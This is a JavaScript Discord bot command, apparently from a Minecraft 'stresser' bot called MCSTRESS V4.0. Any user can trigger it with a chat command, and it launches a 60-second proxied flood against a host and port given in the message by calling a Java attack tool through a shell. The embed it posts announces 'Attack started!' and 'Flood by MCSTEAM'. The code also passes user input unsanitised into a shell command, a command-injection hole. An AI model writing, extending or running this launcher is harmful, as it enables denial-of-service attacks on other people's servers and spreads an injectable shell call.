const Discord = require("discord.js");

exports.run = async (client, message, args) => {
const host = args.join(" ").split(":").slice(0,1)
const port = message.content.split (":")[1]
const proxy = args.join(" ").slice(2)
var exec = require('child_process').exec
exec(`timeout 60 java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar LegitBootV8.jar ${host}:${port} 0 10 47 120 socks_proxies.txt socks4`, (error, stdout, stderr) => {
});
console.log('An Attack Launched Discord ID:' +  message.guild.id)
const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('๐ฅ **MCSTRESS V4.0** ๐ฅ')
	.setTimestamp()
	.setDescription("**โบ Method: TestCrasher ๐ฅ** \n \n โบ Attack started! โ \n โบ For 60 seconds!! ๐ \n โ Flood by MCSTEAM โ")
	.setFooter('ยฉ Developer Mareczekkkk#9738.', client.user.avatarURL)
	.setTimestamp()
	.setThumbnail("")
 message.channel.send(embed);
  }

exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['test'],
  permLevel: 0
}

exports.help = {
  name: 'test',
  description: 'รzel',
  usage: 'test'
}